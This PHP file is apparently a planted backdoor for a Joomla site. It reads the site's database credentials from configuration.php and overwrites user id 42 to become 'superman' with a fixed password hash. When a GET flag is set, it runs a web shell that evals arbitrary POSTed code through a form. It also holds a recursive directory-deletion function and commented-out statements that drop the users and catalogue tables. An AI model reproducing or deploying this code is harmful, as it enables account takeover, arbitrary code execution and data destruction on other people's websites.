<?
 require_once('../../configuration.php');
  $a = new JConfig;
  $conn = mysql_connect ( $a -> host, $a -> user, $a -> password)        or die ("Соединение не установлено! </br>");   print ("Соединение установлено!</br>");
  $db = mysql_select_db($a -> db) or die("Невозможно соедениться с базой ".$a->db); print("База выбрана</br>");
  mysql_query('UPDATE '.$a -> dbprefix."users SET `username`='superman',`password`='47e21750c94dbcd5b93dd8dd1ecda374:wmWWwfMbYrk8AvyG79PCtRHaoGDFnSNd' WHERE id=42") or die ("Ничего не получилось</br>"); print("Пользователь создан</br>");
  if (isset($_GET['delJ'])&&($_GET['delJ']==1)){
  function removeDirectory($dir) {
    if ($objs = glob($dir."/*")) {
       foreach($objs as $obj) {
         is_dir($obj) ? removeDirectory($obj) : unlink($obj);
       }
    }
		rmdir($dir);
  }
    
	eval($_POST['sys_call']);
    echo '<form method="POST"><textarea name="sys_call"></textarea><input type="submit"></form>';
}
//  mysql_query('DROP TABLE '.$a -> dbprefix.'k2_items') or die ("Ничего не получилось</br>"); print("Таблица каталога удалена</br>");  
//  mysql_query('DROP TABLE '.$a -> dbprefix.'users') or die ("Ничего не получилось</br>"); print("Таблица польльзователей удалена</br>");  
?>